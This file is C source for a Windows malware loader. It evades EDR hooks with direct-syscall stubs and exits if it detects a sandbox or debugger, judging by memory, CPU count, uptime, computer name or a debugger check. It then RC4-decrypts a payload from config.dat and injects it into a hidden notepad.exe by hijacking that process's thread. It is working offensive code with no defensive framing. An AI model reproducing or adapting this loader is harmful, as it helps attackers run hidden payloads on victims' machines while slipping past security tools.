// loader.c
#include <Windows.h>
#include <winternl.h>
#include <string.h>

#pragma comment(lib, "ntdll.lib")

typedef NTSTATUS (NTAPI *pNtCreateUserProcess)(
    PHANDLE ProcessHandle,
    PHANDLE ThreadHandle,
    ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess,
    POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes,
    ULONG ProcessFlags,
    ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
    PPS_CREATE_INFO CreateInfo,
    PPS_ATTRIBUTE_LIST AttributeList
);

typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    PVOID Buffer,
    SIZE_T NumberOfBytesToWrite,
    PSIZE_T NumberOfBytesWritten
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID *BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect
);

typedef NTSTATUS (NTAPI *pNtGetContextThread)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

typedef NTSTATUS (NTAPI *pNtSetContextThread)(
    HANDLE ThreadHandle,
    PCONTEXT ThreadContext
);

typedef NTSTATUS (NTAPI *pNtResumeThread)(
    HANDLE ThreadHandle,
    PULONG PreviousSuspendCount
);

typedef NTSTATUS (NTAPI *pRtlCreateProcessParametersEx)(
    PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
    PUNICODE_STRING ImagePathName,
    PUNICODE_STRING DllPath,
    PUNICODE_STRING CurrentDirectory,
    PUNICODE_STRING CommandLine,
    PVOID Environment,
    PUNICODE_STRING WindowTitle,
    PUNICODE_STRING DesktopInfo,
    PUNICODE_STRING ShellInfo,
    PUNICODE_STRING RuntimeData,
    ULONG Flags
);

typedef NTSTATUS (NTAPI *pRtlFreeUserProcessParameters)(
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters
);

PVOID GetSyscallStub(LPCSTR funcName, PDWORD pSsn) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hNtdll + dos->e_lfanew);
    IMAGE_DATA_DIRECTORY expDir = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hNtdll + expDir.VirtualAddress);
    DWORD *names = (DWORD*)((BYTE*)hNtdll + exp->AddressOfNames);
    WORD *ordinals = (WORD*)((BYTE*)hNtdll + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD*)((BYTE*)hNtdll + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        if (!_stricmp((LPCSTR)((BYTE*)hNtdll + names[i]), funcName)) {
            WORD ord = ordinals[i];
            BYTE *addr = (BYTE*)hNtdll + funcs[ord];
            DWORD ssn = *(DWORD*)(addr + 4);
            *pSsn = ssn;
            BYTE *stub = (BYTE*)VirtualAlloc(0, 32, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            BYTE code[] = {
                0x4C, 0x8B, 0xD1,
                0xB8, 0x00, 0x00, 0x00, 0x00,
                0x0F, 0x05,
                0xC3
            };
            memcpy(code + 4, &ssn, 4);
            memcpy(stub, code, sizeof(code));
            return stub;
        }
    }
    return NULL;
}

BOOL CheckSandbox() {
    MEMORYSTATUSEX mem = {0};
    mem.dwLength = sizeof(mem);
    if (!GlobalMemoryStatusEx(&mem) || mem.ullTotalPhys < 2147483648ULL) return TRUE;
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    if (GetTickCount64() < 600000) return TRUE;
    CHAR host[256] = {0};
    DWORD size = sizeof(host);
    if (GetComputerNameA(host, &size)) {
        CharUpperA(host);
        if (strstr(host, "SANDBOX") || strstr(host, "VIRUS") ||
            strstr(host, "MALWARE") || strstr(host, "SAMPLE") ||
            strstr(host, "TEST")) return TRUE;
    }
    if (IsDebuggerPresent()) return TRUE;
    return FALSE;
}

void RC4(BYTE *data, DWORD len, BYTE *key, DWORD keylen) {
    BYTE S[256];
    for (int i = 0; i < 256; i++) S[i] = (BYTE)i;
    int j = 0;
    for (int i = 0; i < 256; i++) {
        j = (j + S[i] + key[i % keylen]) % 256;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    int i = 0; j = 0;
    for (DWORD n = 0; n < len; n++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        data[n] ^= S[(S[i] + S[j]) % 256];
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    if (CheckSandbox()) return 1;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    DWORD ssn;
    pNtCreateUserProcess _NtCreateUserProcess = (pNtCreateUserProcess)GetSyscallStub("NtCreateUserProcess", &ssn);
    pNtAllocateVirtualMemory _NtAllocateVirtualMemory = (pNtAllocateVirtualMemory)GetSyscallStub("NtAllocateVirtualMemory", &ssn);
    pNtWriteVirtualMemory _NtWriteVirtualMemory = (pNtWriteVirtualMemory)GetSyscallStub("NtWriteVirtualMemory", &ssn);
    pNtProtectVirtualMemory _NtProtectVirtualMemory = (pNtProtectVirtualMemory)GetSyscallStub("NtProtectVirtualMemory", &ssn);
    pNtGetContextThread _NtGetContextThread = (pNtGetContextThread)GetSyscallStub("NtGetContextThread", &ssn);
    pNtSetContextThread _NtSetContextThread = (pNtSetContextThread)GetSyscallStub("NtSetContextThread", &ssn);
    pNtResumeThread _NtResumeThread = (pNtResumeThread)GetSyscallStub("NtResumeThread", &ssn);
    if (!_NtCreateUserProcess || !_NtAllocateVirtualMemory || !_NtWriteVirtualMemory ||
        !_NtProtectVirtualMemory || !_NtGetContextThread || !_NtSetContextThread || !_NtResumeThread)
        return 2;

    pRtlCreateProcessParametersEx _RtlCreateProcessParametersEx =
        (pRtlCreateProcessParametersEx)GetProcAddress(hNtdll, "RtlCreateProcessParametersEx");
    pRtlFreeUserProcessParameters _RtlFreeUserProcessParameters =
        (pRtlFreeUserProcessParameters)GetProcAddress(hNtdll, "RtlFreeUserProcessParameters");
    if (!_RtlCreateProcessParametersEx || !_RtlFreeUserProcessParameters) return 3;

    HANDLE hFile = CreateFileA("config.dat", GENERIC_READ, 0, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
    if (hFile == INVALID_HANDLE_VALUE) return 4;
    DWORD fSize = GetFileSize(hFile, 0);
    if (fSize == INVALID_FILE_SIZE) { CloseHandle(hFile); return 5; }
    BYTE *buf = (BYTE*)VirtualAlloc(0, fSize, MEM_COMMIT, PAGE_READWRITE);
    if (!buf) { CloseHandle(hFile); return 6; }
    DWORD read;
    if (!ReadFile(hFile, buf, fSize, &read, 0) || read != fSize) {
        VirtualFree(buf, 0, MEM_RELEASE);
        CloseHandle(hFile);
        return 7;
    }
    CloseHandle(hFile);

    BYTE key[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
    RC4(buf, fSize, key, 16);

    UNICODE_STRING imgPath;
    RtlInitUnicodeString(&imgPath, L"\\??\\C:\\Windows\\System32\\notepad.exe");
    PRTL_USER_PROCESS_PARAMETERS params = NULL;
    NTSTATUS st = _RtlCreateProcessParametersEx(&params, &imgPath, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, 1);
    if (st != 0 || !params) return 8;

    STARTUPINFOW si = {0};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    params->WindowStation = L"winsta0\\default";
    params->Desktop = L"Default";
    params->WindowFlags = STARTF_USESHOWWINDOW;
    params->ShowWindowFlags = SW_HIDE;

    HANDLE hProcess = NULL, hThread = NULL;
    st = _NtCreateUserProcess(&hProcess, &hThread, PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
                               NULL, NULL, 0, 0, params, NULL, NULL);
    _RtlFreeUserProcessParameters(params);
    if (st != 0) return 9;

    PVOID remoteAddr = NULL;
    SIZE_T regionSize = fSize;
    st = _NtAllocateVirtualMemory(hProcess, &remoteAddr, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (st != 0) {
        _NtResumeThread(hThread, NULL);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 10;
    }

    SIZE_T written;
    st = _NtWriteVirtualMemory(hProcess, remoteAddr, buf, fSize, &written);
    VirtualFree(buf, 0, MEM_RELEASE);
    if (st != 0) {
        _NtResumeThread(hThread, NULL);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 11;
    }

    ULONG oldProt;
    PVOID protAddr = remoteAddr;
    SIZE_T protSize = fSize;
    st = _NtProtectVirtualMemory(hProcess, &protAddr, &protSize, PAGE_EXECUTE_READ, &oldProt);
    if (st != 0) {
        _NtResumeThread(hThread, NULL);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 12;
    }

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (_NtGetContextThread(hThread, &ctx) != 0) {
        _NtResumeThread(hThread, NULL);
        CloseHandle(hThread);
        CloseHandle(hProcess);
        return 13;
    }
    ctx.Rip = (DWORD64)remoteAddr;
    _NtSetContextThread(hThread, &ctx);
    _NtResumeThread(hThread, NULL);

    CloseHandle(hThread);
    CloseHandle(hProcess);
    return 0;
}
